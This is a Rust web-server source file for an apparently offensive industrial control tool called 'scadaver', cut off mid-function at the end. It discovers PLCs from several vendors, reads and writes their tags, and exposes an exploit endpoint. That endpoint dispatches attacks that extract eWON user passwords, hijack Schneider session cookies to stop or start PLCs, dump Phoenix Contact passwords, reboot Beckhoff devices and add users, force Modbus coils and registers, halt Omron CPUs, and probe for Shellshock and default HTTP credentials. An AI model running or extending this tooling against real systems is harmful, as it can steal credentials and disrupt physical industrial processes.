use axum::{
    extract::{
        ws::{Message, WebSocket, WebSocketUpgrade},
        Path, Query, State,
    },
    http::{header, HeaderMap, StatusCode},
    response::{Html, IntoResponse, Response},
    routing::{delete, get, post},
    Json, Router,
};
use std::sync::Arc;
use serde::{Deserialize, Serialize};
use serde_json::{json, Map, Value};
use std::fmt::Write as _;
use std::time::Duration;
use tokio::time::sleep;

// ─── Embedded static files ────────────────────────────────────────────────────

const INDEX_HTML: &str = include_str!("static/index.html");
const APP_JS: &str = include_str!("static/app.js");
const STYLE_CSS: &str = include_str!("static/style.css");

// ─── Request types ────────────────────────────────────────────────────────────

#[derive(Deserialize)]
struct ScanIpReq {
    ip: String,
    #[serde(default = "default_timeout")]
    timeout: u64,
}

#[derive(Deserialize)]
struct ScanNetworkReq {
    #[serde(default)]
    vendor: String,
    #[serde(default = "default_timeout")]
    timeout: u64,
    #[serde(default)]
    iface_ip: String,
}

#[derive(Deserialize, Serialize)]
struct DeviceReq {
    ip: String,
    vendor: String,
    #[serde(default)]
    fields: Value,
}

#[derive(Deserialize)]
struct TagsReq {
    ip: String,
    vendor: String,
    #[serde(default)]
    cache: bool,
}

#[derive(Deserialize)]
struct WriteReq {
    ip: String,
    vendor: String,
    tag: String,
    value: String,
    /// CIP type code, sent by the UI when writing a Logix tag or UDT member. Without it
    /// the driver cannot know how to encode the text, so Rockwell writes require it.
    #[serde(default)]
    type_code: Option<u16>,
}

#[derive(Deserialize)]
struct HistoryQuery {
    ip: String,
    vendor: String,
}

#[derive(Deserialize)]
struct ExploitReq {
    ip: String,
    #[serde(default)]
    username: String,
    #[serde(default)]
    password: String,
}

#[derive(Deserialize)]
struct MonitorQuery {
    #[serde(default)]
    vendor: String,
}

#[derive(Deserialize)]
struct PortscanReq {
    ip: String,
    #[serde(default = "default_timeout")]
    timeout: u64,
    #[serde(default)]
    extra_ports: Vec<u16>,
}

fn default_timeout() -> u64 {
    5
}

// ─── Router ───────────────────────────────────────────────────────────────────

pub fn build_router(api_key: String) -> Router {
    Router::new()
        .route("/", get(index_html))
        .route("/static/app.js", get(app_js))
        .route("/static/style.css", get(style_css))
        .route("/health", get(health))
        .route("/api/interfaces", get(api_interfaces))
        .route("/api/devices", get(api_list_devices).post(api_save_device))
        .route("/api/devices/:ip", delete(api_delete_device))
        .route("/api/scan", post(api_scan))
        .route("/api/scan/ip", post(api_scan_ip))
        .route("/api/device/tags", post(api_device_tags))
        .route("/api/device/write", post(api_device_write))
        .route("/api/device/history", get(api_device_history))
        .route("/api/exploit/*id", post(api_exploit))
        .route("/api/run/portscan", post(api_portscan))
        .route("/ws/monitor/:ip", get(ws_monitor))
        .with_state(Arc::new(api_key))
}

/// Look up a single string field from the stored device record for `ip`.
/// Returns `None` if the device is not in the DB or the field is absent/non-string.
fn device_field_str(ip: &str, key: &str) -> Option<String> {
    let db = crate::db::Database::open(&crate::db::Database::default_path()).ok()?;
    let devices = db.load_devices().ok()?;
    let dev = devices.into_iter().find(|d| d.ip == ip)?;
    dev.fields[key].as_str().map(str::to_string)
}

fn require_api_key(headers: &HeaderMap, key: &str) -> Option<(StatusCode, Json<serde_json::Value>)> {
    let provided = headers
        .get("x-api-key")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("");
    if provided == key {
        None
    } else {
        Some((StatusCode::UNAUTHORIZED, Json(serde_json::json!({"error": "missing or invalid X-API-Key header"}))))
    }
}

// ─── Static files ─────────────────────────────────────────────────────────────

async fn index_html() -> Html<&'static str> {
    Html(INDEX_HTML)
}

async fn app_js() -> impl IntoResponse {
    ([(header::CONTENT_TYPE, "application/javascript; charset=utf-8")], APP_JS)
}

async fn style_css() -> impl IntoResponse {
    ([(header::CONTENT_TYPE, "text/css; charset=utf-8")], STYLE_CSS)
}

async fn health() -> Json<Value> {
    Json(json!({"status": "ok", "version": "1.0.0"}))
}

// ─── Interfaces ───────────────────────────────────────────────────────────────

async fn api_interfaces() -> Json<Value> {
    let ifaces = tokio::task::spawn_blocking(crate::core::network::get_interfaces)
        .await
        .unwrap_or_default();

    let list: Vec<Value> = ifaces
        .iter()
        .map(|i| json!({"name": i.name, "ip": i.ip, "netmask": i.netmask}))
        .collect();
    Json(json!({"interfaces": list}))
}

// ─── Device persistence ───────────────────────────────────────────────────────

async fn api_list_devices() -> Json<Value> {
    let result = tokio::task::spawn_blocking(|| {
        let db = crate::db::Database::open(&crate::db::Database::default_path())?;
        db.load_devices()
    })
    .await;

    let Ok(Ok(devices)) = result else { return Json(json!({"devices": []})) };

    let list: Vec<Value> = devices
        .iter()
        .map(|d| {
            json!({
                "id": d.id,
                "ip": d.ip,
                "vendor": d.vendor,
                "last_seen": d.last_seen,
                "fields": d.fields,
            })
        })
        .collect();
    Json(json!({"devices": list}))
}

async fn api_save_device(Json(req): Json<DeviceReq>) -> Json<Value> {
    let ip = req.ip.clone();
    let vendor = req.vendor.clone();
    let fields = req.fields.clone();
    let result = tokio::task::spawn_blocking(move || {
        let db = crate::db::Database::open(&crate::db::Database::default_path())?;
        db.upsert_device(&ip, &vendor, &fields)
    })
    .await;

    match result {
        Ok(Ok(id)) => Json(json!({"success": true, "id": id})),
        Ok(Err(e)) => Json(json!({"success": false, "error": e.to_string()})),
        Err(e) => Json(json!({"success": false, "error": e.to_string()})),
    }
}

async fn api_delete_device(Path(ip): Path<String>) -> Json<Value> {
    let result = tokio::task::spawn_blocking(move || {
        let db = crate::db::Database::open(&crate::db::Database::default_path())?;
        db.delete_device_by_ip(&ip)
    })
    .await;

    match result {
        Ok(Ok(())) => Json(json!({"success": true})),
        Ok(Err(e)) => Json(json!({"success": false, "error": e.to_string()})),
        Err(e) => Json(json!({"success": false, "error": e.to_string()})),
    }
}

// ─── Scan ─────────────────────────────────────────────────────────────────────

async fn api_scan_ip(Json(req): Json<ScanIpReq>) -> Json<Value> {
    let ip = req.ip.clone();
    let timeout = req.timeout;

    let detected = tokio::task::spawn_blocking(move || {
        crate::core::autodetect::detect_device(&ip, timeout)
    })
    .await
    .unwrap_or(None);

    match detected {
        Some(dev) => {
            // Persist to DB asynchronously
            let ip2 = dev.ip.clone();
            let vendor2 = dev.vendor.clone();
            let fields2 = serde_json::to_value(&dev.fields).unwrap_or_default();
            tokio::spawn(tokio::task::spawn_blocking(move || {
                if let Ok(db) = crate::db::Database::open(&crate::db::Database::default_path()) {
                    let _ = db.upsert_device(&ip2, &vendor2, &fields2);
                }
            }));

            let mut resp = Map::new();
            resp.insert("ip".into(), dev.ip.into());
            resp.insert("vendor".into(), dev.vendor.into());
            for (k, v) in &dev.fields {
                resp.insert(k.clone(), v.clone());
            }
            Json(Value::Object(resp))
        }
        None => Json(json!({"error": "No ICS device detected at that IP"})),
    }
}

async fn api_scan(Json(req): Json<ScanNetworkReq>) -> Json<Value> {
    let vendor = req.vendor.clone();
    let timeout = req.timeout;
    let iface_ip = req.iface_ip.clone();

    let result = tokio::task::spawn_blocking(move || {
        broadcast_scan(&vendor, timeout, &iface_ip)
    })
    .await;

    match result {
        Ok(Ok(devices)) => Json(json!({"devices": devices})),
        Ok(Err(e)) => Json(json!({"error": e.to_string()})),
        Err(e) => Json(json!({"error": e.to_string()})),
    }
}

fn broadcast_scan(
    vendor: &str,
    timeout: u64,
    iface_ip: &str,
) -> anyhow::Result<Vec<Value>> {
    use crate::core::network::get_interfaces;

    let ifaces = get_interfaces();
    let iface = if iface_ip.is_empty() {
        ifaces
            .into_iter()
            .next()
            .ok_or_else(|| anyhow::anyhow!("No network interfaces found"))?
    } else {
        ifaces
            .into_iter()
            .find(|i| i.ip == iface_ip)
            .ok_or_else(|| anyhow::anyhow!("Interface {iface_ip} not found"))?
    };

    let mut devices: Vec<Value> = Vec::new();

    let scan_beckhoff = matches!(vendor, "beckhoff" | "all" | "");
    let scan_enip = matches!(vendor, "enip" | "rockwell" | "all" | "");
    let scan_ewon = matches!(vendor, "ewon" | "all" | "");
    let scan_schneider = matches!(vendor, "schneider" | "modicon" | "all" | "");
    let scan_mitsubishi = matches!(vendor, "mitsubishi" | "all" | "");

    if scan_beckhoff {
        if let Ok(devs) = crate::vendors::beckhoff::scan::discover(&iface, timeout, true) {
            for d in devs {
                devices.push(json!({
                    "ip": d.ip,
                    "vendor": "beckhoff",
                    "name": d.name,
                    "netid": d.netid_str,
                    "tc_version": d.tc_version,
                }));
            }
        }
    }

    if scan_enip {
        if let Ok(devs) = crate::vendors::enip::scan::scan(&iface, timeout, true) {
            for d in devs {
                let v = if matches!(
                    u16::from_str_radix(&d.vendor_id, 16).unwrap_or(0),
                    1 | 5 | 77
                ) {
                    "rockwell"
                } else {
                    "enip"
                };
                devices.push(json!({
                    "ip": d.ip,
                    "vendor": v,
                    "product_name": d.product_name,
                    "vendor_id": d.vendor_id,
                }));
            }
        }
    }

    if scan_ewon {
        if let Ok(devs) = crate::vendors::ewon::scan::scan(&iface, timeout, true) {
            for d in devs {
                if let Some(ip) = &d.ip {
                    devices.push(json!({
                        "ip": ip,
                        "vendor": "ewon",
                        "mac": d.mac,
                        "serial": d.serial,
                        "firmware": d.firmware,
                    }));
                }
            }
        }
    }

    if scan_schneider {
        if let Ok(devs) = crate::vendors::schneider::scan::scan(&iface, timeout, true) {
            for d in devs {
                devices.push(json!({
                    "ip": d.ip,
                    "vendor": "schneider",
                    "name": d.name,
                    "firmware": d.firmware,
                }));
            }
        }
    }

    if scan_mitsubishi {
        if let Ok(devs) = crate::vendors::mitsubishi::scan::scan(&iface, timeout, true) {
            for d in devs {
                devices.push(json!({
                    "ip": d.ip,
                    "vendor": "mitsubishi",
                    "plc_type": d.plc_type,
                    "title": d.title,
                }));
            }
        }
    }

    Ok(devices)
}

// ─── Tags ─────────────────────────────────────────────────────────────────────

async fn api_device_tags(Json(req): Json<TagsReq>) -> Json<Value> {
    let ip = req.ip.clone();
    let vendor = req.vendor.clone();
    let cache = req.cache;

    match tokio::task::spawn_blocking(move || {
        if cache {
            read_tags_from_db(&ip)
        } else {
            let tags = read_tags_for_vendor(&ip, &vendor);
            // Persist the freshly-pulled tags under a `_tags` key inside the device
            // record so they survive restarts and appear in the cached Tags tab.
            if let Ok(db) = crate::db::Database::open(&crate::db::Database::default_path()) {
                if let Ok(devices) = db.load_devices() {
                    if let Some(dev) = devices.iter().find(|d| d.ip == ip) {
                        let mut fields = dev.fields.clone();
                        if let Value::Object(ref mut map) = fields {
                            map.insert("_tags".into(), tags.clone());
                        }
                        let _ = db.upsert_device(&ip, &vendor, &fields);
                    }
                }
            }
            tags
        }
    }).await {
        Ok(tags) => Json(json!({"tags": tags})),
        Err(e) => Json(json!({"error": e.to_string()})),
    }
}

#[allow(clippy::too_many_lines)] // single-responsibility match dispatch over 10 protocol families
fn read_tags_for_vendor(ip: &str, vendor: &str) -> Value {
    let mut tags = Map::new();

    match vendor {
        "modicon" | "schneider" | "modbus" => {
            let port = crate::core::modbus::DEFAULT_PORT;
            if let Ok(regs) = crate::core::modbus::read_holding_registers(ip, port, 0, 16) {
                for r in regs {
                    tags.insert(format!("hr:{}", r.address), r.raw.into());
                }
            }
            if let Ok(coils) = crate::core::modbus::read_coils(ip, port, 0, 16) {
                for r in coils {
                    tags.insert(format!("coil:{}", r.address), Value::Bool(r.raw != 0));
                }
            }
        }
        "siemens" => {
            let password = device_field_str(ip, "password");
            let data = crate::vendors::siemens::s7comm::read_all_data(
                ip, 102, 5, password.as_deref(),
            );
            for (area, maybe_bits) in &data {
                let Some(bits) = maybe_bits else { continue };
                let prefix = match area.as_str() {
                    "inputs" => "I",
                    "outputs" => "Q",
                    "merkers" => "M",
                    _ => continue,
                };
                let mut keys: Vec<&String> = bits.keys().collect();
                keys.sort();
                for key in keys {
                    let name = format!("{prefix}{key}");
                    let val: Value = if bits[key] != 0 { "ON".into() } else { "OFF".into() };
                    tags.insert(name, val);
                }
            }
        }
        // ── Mitsubishi MELSEC: live D-word and M-bit reads ──────────────────
        "mitsubishi" | "slmp" => {
            use crate::vendors::mitsubishi::slmp;
            if let Ok(words) = slmp::read_word_devices(ip, 5007, "D", 0, 10) {
                for v in &words {
                    tags.insert(v.display.clone(), v.raw.into());
                }
            }
            if let Ok(bits) = slmp::read_bit_devices(ip, 5007, "M", 0, 10) {
                for v in &bits {
                    tags.insert(v.display.clone(), v.value_str.clone().into());
                }
            }
        }
        // ── Omron FINS: live DM-word reads ───────────────────────────────────
        "omron" | "fins" => {
            use crate::vendors::omron::fins;
            if let Ok(words) = fins::read_dm_words(ip, 9600, 0, 0, 10) {
                for (i, val) in words.iter().enumerate() {
                    tags.insert(format!("DM{i}"), (*val).into());
                }
            }
        }
        // ── Rockwell Allen-Bradley: live CIP tag enumerate + bulk read ───────
        "rockwell" | "enip" | "ethernet_ip" => {
            use crate::vendors::rockwell::driver;
            if let Ok(all_tags) = driver::enumerate_tags(ip, 44818) {
                let templates = driver::enumerate_templates(ip, 44818, &all_tags);
                let display: Vec<&driver::LogixTag> = all_tags
                    .iter()
                    .filter(|t| !t.name.starts_with('_'))
                    .take(50)
                    .collect();
                let names: Vec<&str> = display.iter().map(|t| t.name.as_str()).collect();
                let values = driver::read_tags_bulk(ip, 44818, &names);
                for (tag, maybe_data) in display.iter().zip(values.iter()) {
                    let display_str = maybe_data
                        .as_deref()
                        .map_or_else(|| "-".into(), |b| {
                            driver::decode_value(tag.tag_type, b, Some(&templates))
                        });
                    // Struct tags carry a flattened member list so the UI can render one
                    // editable row per leaf. Each `path` appends to the tag name to form a
                    // CIP-addressable member path, and `type` lets the UI request a typed
                    // write without re-deriving the layout.
                    let json_val = if driver::is_struct_type(tag.tag_type) {
                        let leaves = maybe_data
                            .as_deref()
                            .map(|b| {
                                driver::flatten_struct(
                                    driver::struct_body(b),
                                    tag.tag_type & 0x0FFF,
                                    Some(&templates),
                                )
                            })
                            .unwrap_or_default();
                        let fields: Vec<Value> = leaves
                            .iter()
                            .map(|leaf| {
                                json!({
                                    "path": leaf.path,
                                    "value": leaf.value,
                                    "type": leaf.cip_type,
                                    "type_name": driver::type_name(leaf.cip_type),
                                    "writable": leaf.writable,
                                })
                            })
                            .collect();
                        json!({
                            "_display": display_str,
                            "_type": driver::type_name(tag.tag_type),
                            "_fields": fields,
                        })
                    } else {
                        json!({
                            "_display": display_str,
                            "_type": driver::type_name(tag.tag_type),
                            "_scalar": true,
                            "_write_type": tag.tag_type,
                            "_writable": driver::is_writable_type(tag.tag_type),
                        })
                    };
                    tags.insert(tag.name.clone(), json_val);
                }
            }
        }
        // ── Phoenix Contact WebVisit: live tag reads via ILRReadValues CGI ───
        "phoenix" | "webvisit" => {
            use crate::vendors::phoenix::webvisit;
            if let Ok((_, tag_names)) = webvisit::get_tags(ip, 80) {
                if let Ok(values) = webvisit::read_tag_values(ip, 80, &tag_names) {
                    for (name, val) in values {
                        tags.insert(name, Value::String(val));
                    }
                }
            }
        }
        // ── IEC 60870-5-104: General Interrogation → decoded data objects ────
        "iec104" => {
            use crate::vendors::iec104::client;
            if let Ok(mut session) = client::connect(ip, 0) {
                if let Ok(objects) = client::general_interrogation(&mut session) {
                    for obj in objects {
                        tags.insert(format!("IOA {}", obj.ioa), Value::String(obj.decoded));
                    }
                }
            }
        }
        // ── Beckhoff ADS: enumerate symbols and read values ───────────────────
        "beckhoff" | "ads" => {
            use crate::vendors::beckhoff::{ads, scan};
            use crate::core::network::local_ip_for;
            let local_netid = ads::build_local_netid(&local_ip_for(ip));
            if let Ok(devices) = scan::discover_ip(ip, 3, true) {
                if let Some(dev) = devices.into_iter().next() {
                    let symbols = scan::enumerate_symbols(&dev, &local_netid, 48898);
                    for sym in &symbols {
                        if let Some(val) = &sym.value_str {
                            tags.insert(sym.name.clone(), Value::String(val.clone()));
                        }
                    }
                }
            }
        }
        // ── eWON Flexy: live tag values via REST API ──────────────────────────
        "ewon" => {
            let ewon_user = device_field_str(ip, "username");
            let ewon_pass = device_field_str(ip, "password");
            let ewon_creds = ewon_user.as_deref().zip(ewon_pass.as_deref());
            if let Ok(tag_values) = crate::vendors::ewon::scan::read_tag_values(ip, 80, ewon_creds) {
                for (name, val) in tag_values {
                    tags.insert(name, Value::String(val));
                }
            }
        }
        // ── SNMP: walk MIB-II system OID tree ────────────────────────────────
        "snmp" => {
            use crate::vendors::snmp::client;
            let community = device_field_str(ip, "community").unwrap_or_else(|| "public".to_string());
            if let Ok(varbinds) = client::walk(ip, 161, &community, ".1.3.6.1.2.1.1") {
                for (oid, val) in varbinds {
                    tags.insert(oid, Value::String(val.display()));
                }
            }
        }
        _ => {}
    }

    Value::Object(tags)
}

fn read_tags_from_db(ip: &str) -> Value {
    if let Ok(db) = crate::db::Database::open(&crate::db::Database::default_path()) {
        if let Ok(devices) = db.load_devices() {
            if let Some(dev) = devices.iter().find(|d| d.ip == ip) {
                if let Value::Object(fields) = &dev.fields {
                    if let Some(cached) = fields.get("_tags") {
                        return cached.clone();
                    }
                }
            }
        }
    }
    Value::Object(Map::new())
}

// ─── Write tag ────────────────────────────────────────────────────────────────

async fn api_device_write(
    State(key): State<Arc<String>>,
    headers: HeaderMap,
    Json(req): Json<WriteReq>,
) -> Response {
    if let Some(err) = require_api_key(&headers, &key) {
        return err.into_response();
    }
    api_device_write_inner(req).await.into_response()
}

async fn api_device_write_inner(req: WriteReq) -> Json<Value> {
    let ip = req.ip.clone();
    let vendor = req.vendor.clone();
    let tag = req.tag.clone();
    let value = req.value.clone();
    let type_code = req.type_code;

    let result = tokio::task::spawn_blocking(move || {
        write_tag_for_vendor(&ip, &vendor, &tag, &value, type_code)
    })
    .await;

    match result {
        Ok(Ok(())) => Json(json!({"success": true})),
        Ok(Err(e)) => Json(json!({"success": false, "error": e.to_string()})),
        Err(e) => Json(json!({"success": false, "error": e.to_string()})),
    }
}

/// Write one Logix scalar or UDT member.
///
/// `tag` may be a plain tag name or a dotted member path such as `Pump.Cmd.SP`; the driver
/// encodes each component as its own CIP symbolic segment. `type_code` is required because
/// the text has to be encoded to the member's exact CIP type — guessing risks writing a
/// different value than the operator typed.
fn write_rockwell_tag(
    ip: &str,
    tag: &str,
    value: &str,
    type_code: Option<u16>,
) -> anyhow::Result<()> {
    use crate::vendors::rockwell::driver;

    let cip_type = type_code.ok_or_else(|| {
        anyhow::anyhow!(
            "Writing '{tag}' needs its CIP type code; reload the tag list so the UI can \
             supply it, or use the CLI: scadaver -i {ip} set tag {tag} <value>"
        )
    })?;
    if !driver::is_writable_type(cip_type) {
        anyhow::bail!(
            "'{tag}' has CIP type 0x{:02X} ({}), which is not a writable scalar. \
             Arrays and whole structures must be written element by element.",
            cip_type & 0xFF,
            driver::type_name(cip_type)
        );
    }
    let bytes = driver::encode_value_for_type(cip_type, value)?;
    driver::write_tag(ip, 0, tag, cip_type & 0x0FFF, &bytes)
}

fn write_tag_for_vendor(
    ip: &str,
    vendor: &str,
    tag: &str,
    value: &str,
    type_code: Option<u16>,
) -> anyhow::Result<()> {
    use crate::core::modbus;

    // ── Siemens S7 ───────────────────────────────────────────────────────────
    // Tags displayed as "Q0.0"…"Q0.7" (outputs) and "M0.0"…"M0.7" (merkers).
    if matches!(vendor, "siemens" | "s7") {
        use crate::vendors::siemens::s7comm;
        let (area, byte_idx, bit_idx) = parse_s7_bit_tag(tag).ok_or_else(|| {
            anyhow::anyhow!("Siemens tag must be Q<byte>.<bit> or M<byte>.<bit>, got: {tag}")
        })?;
        let bit_on = parse_bool_value(value);
        let password = device_field_str(ip, "password");
        match area {
            'Q' => s7comm::write_output_bit(ip, byte_idx, bit_idx, bit_on, 102, 5, password.as_deref())?,
            'M' => s7comm::write_merker_bit(ip, byte_idx, bit_idx, bit_on, 102, 5, password.as_deref())?,
            _ => anyhow::bail!("Unsupported Siemens area '{area}'; use Q or M"),
        }
        return Ok(());
    }

    // ── Mitsubishi MELSEC ────────────────────────────────────────────────────
    // Tags displayed as "D0"…"D9" (word) and "M0"…"M9" (bit).
    if matches!(vendor, "mitsubishi" | "slmp") {
        use crate::vendors::mitsubishi::slmp;
        if let Some(rest) = tag.strip_prefix('D') {
            let addr: u32 = rest
                .trim()
                .parse()
                .map_err(|_| anyhow::anyhow!("Invalid D-register address: {rest}"))?;
            let val: u16 = value
                .trim()
                .parse()
                .map_err(|_| anyhow::anyhow!("D value must be 0–65535, got: {value}"))?;
            slmp::write_word_devices(ip, 5007, "D", addr, &[val])?;
        } else if let Some(rest) = tag.strip_prefix('M') {
            let addr: u32 = rest
                .trim()
                .parse()
                .map_err(|_| anyhow::anyhow!("Invalid M-coil address: {rest}"))?;
            slmp::write_bit_devices(ip, 5007, "M", addr, &[parse_bool_value(value)])?;
        } else {
            anyhow::bail!("Mitsubishi tag must be D<n> or M<n>, got: {tag}");
        }
        return Ok(());
    }

    // ── Omron FINS ───────────────────────────────────────────────────────────
    // Tags displayed as "DM0"…"DM9" (word).
    if matches!(vendor, "omron" | "fins") {
        use crate::vendors::omron::fins;
        if let Some(rest) = tag.strip_prefix("DM") {
            let addr: u16 = rest
                .trim()
                .parse()
                .map_err(|_| anyhow::anyhow!("Invalid DM address: {rest}"))?;
            let val: u16 = value
                .trim()
                .parse()
                .map_err(|_| anyhow::anyhow!("DM value must be 0–65535, got: {value}"))?;
            fins::write_dm_words(ip, 9600, 0, addr, &[val])?;
        } else {
            anyhow::bail!("Omron tag must be DM<n>, got: {tag}");
        }
        return Ok(());
    }

    // ── Beckhoff / Rockwell: actionable CLI guidance ──────────────────────────
    if matches!(vendor, "beckhoff" | "ads") {
        anyhow::bail!(
            "Beckhoff symbol writes require the CLI: scadaver -i {ip} run write-symbol"
        );
    }
    // ── Rockwell Logix ───────────────────────────────────────────────────────
    if matches!(vendor, "rockwell" | "enip" | "ethernet_ip") {
        return write_rockwell_tag(ip, tag, value, type_code);
    }

    // ── Modbus / Schneider / generic ─────────────────────────────────────────
    if let Some(rest) = tag.strip_prefix("hr:") {
        let address: u16 = rest
            .trim()
            .parse()
            .map_err(|_| anyhow::anyhow!("Invalid register address: {rest}"))?;
        let val: u16 = value
            .trim()
            .parse()
            .map_err(|_| anyhow::anyhow!("Invalid register value: {value}"))?;
        modbus::write_single_register(ip, modbus::DEFAULT_PORT, address, val)?;
        return Ok(());
    }

    if let Some(rest) = tag.strip_prefix("coil:") {
        let address: u16 = rest
            .trim()
            .parse()
            .map_err(|_| anyhow::anyhow!("Invalid coil address: {rest}"))?;
        modbus::write_single_coil(ip, modbus::DEFAULT_PORT, address, parse_bool_value(value))?;
        return Ok(());
    }

    anyhow::bail!(
        "Unknown tag format '{tag}' for vendor '{vendor}'. \
         Use hr:<addr> or coil:<addr> for Modbus, Q<b>.<n>/M<b>.<n> for Siemens, \
         D<n>/M<n> for Mitsubishi, DM<n> for Omron."
    )
}

fn parse_s7_bit_tag(tag: &str) -> Option<(char, u8, u8)> {
    let area = tag.chars().next()?;
    let rest = &tag[1..];
    let (byte_s, bit_s) = rest.split_once('.')?;
    Some((area, byte_s.parse().ok()?, bit_s.parse().ok()?))
}

fn parse_bool_value(s: &str) -> bool {
    !matches!(
        s.trim().to_ascii_lowercase().as_str(),
        "false" | "0" | "off"
    )
}

// ─── History ──────────────────────────────────────────────────────────────────

async fn api_device_history(Query(q): Query<HistoryQuery>) -> Json<Value> {
    let ip = q.ip.clone();
    let vendor = q.vendor.clone();

    let result = tokio::task::spawn_blocking(move || {
        let db = crate::db::Database::open(&crate::db::Database::default_path())?;
        db.load_data_points(&ip, &vendor)
    })
    .await;

    match result {
        Ok(Ok(points)) => {
            let list: Vec<Value> = points
                .iter()
                .map(|p| json!({"address": p.address, "last_value": p.last_value}))
                .collect();
            Json(json!({"history": list}))
        }
        _ => Json(json!({"history": []})),
    }
}

// ─── Exploits ─────────────────────────────────────────────────────────────────

async fn api_exploit(
    State(key): State<Arc<String>>,
    headers: HeaderMap,
    Path(id): Path<String>,
    Json(req): Json<ExploitReq>,
) -> Response {
    if let Some(err) = require_api_key(&headers, &key) {
        return err.into_response();
    }
    api_exploit_inner(id, req).await.into_response()
}

async fn api_exploit_inner(id: String, req: ExploitReq) -> Json<Value> {
    let exploit_id = id.trim_start_matches('/').to_string();
    let ip = req.ip.clone();
    let username = req.username.clone();
    let password = req.password.clone();

    let result = tokio::task::spawn_blocking(move || {
        run_exploit(&exploit_id, &ip, &username, &password)
    })
    .await;

    match result {
        Ok(Ok(output)) => Json(json!({"success": true, "output": output})),
        Ok(Err(e)) => Json(json!({"success": false, "error": e.to_string()})),
        Err(e) => Json(json!({"success": false, "error": e.to_string()})),
    }
}

#[allow(clippy::too_many_lines)] // single-responsibility match dispatch over many exploit types
fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Result<String> {
    match id {
        "ewon/creds" => {
            let users = crate::vendors::ewon::exploit::exploit(ip, 0, "adm", 20);
            if users.is_empty() {
                return Ok("No credentials extracted.".into());
            }
            let mut out = String::new();
            for u in &users {
                writeln!(out,
                    "User: {} ({} {})\n  Password: {}\n  Rights: {}\n---",
                    u.username, u.first_name, u.last_name, u.password, u.access_rights
                ).ok();
            }
            Ok(out)
        }

        "schneider/flash" => {
            crate::vendors::schneider::flash_led::flash_led_ip(ip)?;
            Ok(format!("Flash LED command sent to {ip}."))
        }

        "schneider/session_stop" | "schneider/session_run" => {
            use crate::vendors::schneider::session_hijack;
            let Some(session) = session_hijack::get_session_cookie(ip, 0) else {
                anyhow::bail!("Could not retrieve session cookie from {ip}");
            };
            let action = if id == "schneider/session_stop" { "stop" } else { "start" };
            let ok = session_hijack::control_plc(ip, 0, &session.cookie_value, "USER", action);
            if ok {
                Ok(format!("PLC {action} command sent (cookie: {}).", session.cookie_value))
            } else {
                anyhow::bail!("Control command failed")
            }
        }

        "phoenix/passwords" => {
            let entries = crate::vendors::phoenix::webvisit::retrieve_passwords(ip, 0)?;
            if entries.is_empty() {
                return Ok("No passwords found.".into());
            }
            let mut out = String::new();
            for e in &entries {
                if let Some(p) = &e.password {
                    writeln!(out, "Level {}: {p}", e.user_level).ok();
                } else if let Some(h) = &e.hash {
                    writeln!(out, "Level {} [sha256]: {h}", e.user_level).ok();
                }
            }
            Ok(out)
        }

        "beckhoff/reboot" => {
            let ok = crate::vendors::beckhoff::webcontrol::reboot(ip, 0)?;
            if ok {
                Ok(format!("Reboot command sent to {ip}."))
            } else {
                anyhow::bail!("Reboot command did not confirm")
            }
        }

        "beckhoff/adduser" => {
            if username.is_empty() || password.is_empty() {
                anyhow::bail!("Username and password are required");
            }
            let ok = crate::vendors::beckhoff::webcontrol::add_user(ip, 0, username, password)?;
            if ok {
                Ok(format!("User '{username}' added to {ip}."))
            } else {
                anyhow::bail!("Add user command did not confirm")
            }
        }

        "modicon/write_coil" => {
            let addr: u16 = username
                .trim()
                .parse()
                .map_err(|_| anyhow::anyhow!("Invalid coil address: '{username}'"))?;
            let on = !matches!(
                password.trim().to_ascii_lowercase().as_str(),
                "false" | "0" | "off"
            );
            crate::core::modbus::write_single_coil(
                ip,
                crate::core::modbus::DEFAULT_PORT,
                addr,
                on,
            )?;
            Ok(format!("Coil {addr} set to {}.", if on { "ON" } else { "OFF" }))
        }

        "modicon/write_register" => {
            let addr: u16 = username
                .trim()
                .parse()
                .map_err(|_| anyhow::anyhow!("Invalid register address: '{username}'"))?;
            let val: u16 = password
                .trim()
                .parse()
                .map_err(|_| anyhow::anyhow!("Invalid register value: '{password}'"))?;
            crate::core::modbus::write_single_register(
                ip,
                crate::core::modbus::DEFAULT_PORT,
                addr,
                val,
            )?;
            Ok(format!("Register {addr} written: {val}"))
        }

        "common/shellshock" => {
            let results = crate::core::shellshock::test_shellshock(ip, 80, 8);
            let mut out = String::new();
            let mut any_vuln = false;
            for r in &results {
                let status = if r.vulnerable { "VULNERABLE" } else { "safe" };
                writeln!(out, "{:<36} {:<12} {}", r.path, status, r.evidence).ok();
                if r.vulnerable {
                    any_vuln = true;
                }
            }
            if any_vuln {
                out.push_str("\n[!] Target may be vulnerable to CVE-2014-6271 (Shellshock).");
            } else {
                out.push_str("\n[*] No Shellshock vulnerability detected.");
            }
            Ok(out)
        }

        "common/httpcreds" => {
            match crate::core::httpcreds::test_http_basic(ip, 80, "/", 8) {
                Some(r) => Ok(format!(
                    "Valid credentials found: {}:{} (HTTP {})\nPath: {}",
                    r.username, r.password, r.status, r.path
                )),
                None => Ok("No default credentials accepted by HTTP basic auth.".into()),
            }
        }

        "omron/info" => {
            use crate::vendors::omron::fins;
            let dev = fins::get_device_info_tcp(ip, 9600)?;
            Ok(format!(
                "Node:    {}\nModel:   {}\nVersion: {}",
                dev.node_addr, dev.model, dev.version
            ))
        }

        "omron/cpu_status" => {
            use crate::vendors::omron::fins;
            let state = fins::get_cpu_state(ip, 9600, 0)?;
            Ok(format!("CPU state: {state}"))
        }

        "omron/cpu_run" => {
            use crate::vendors::omron::fins;
            let ok = fins::set_cpu_mode(ip, 9600, 0, true)?;
            if ok {
                Ok(format!("CPU set to Monitor (Run) mode on {ip}."))
            } else {
                anyhow::bail!("CPU mode change was not confirmed by device")
            }
        }

        "omron/cpu_stop" => {
            use crate::vendors::omron::fins;
            let ok = fins::set_cpu_mode(ip, 9600, 0, false)?;
            if ok {
                Ok(format!("CPU set to Stop mode on {ip}."))
            } else {
                anyhow::bail!("CPU mode change was not confirmed by device")
            }
        }

        "omron/read_dm" => {
            use crate::vendors::omron::fins;
            let start: u16 = username.trim().parse().unwrap_or(0);
            let count: u16 = password.trim().parse().unwrap_or(10).min(100);
            let words = fins::read_dm_words(ip, 9600, 0, start, count)?;
            let mut out = String::new();
            for (i, val) in words.iter().enumerate() {
                writeln!(out, "DM{}: {val}", start as usize + i).ok();
            }
            Ok(out)
        }

        "omron/write_dm" => {
            use crate::vendors::omron::fins;
            let start: u16 = username.trim().parse()
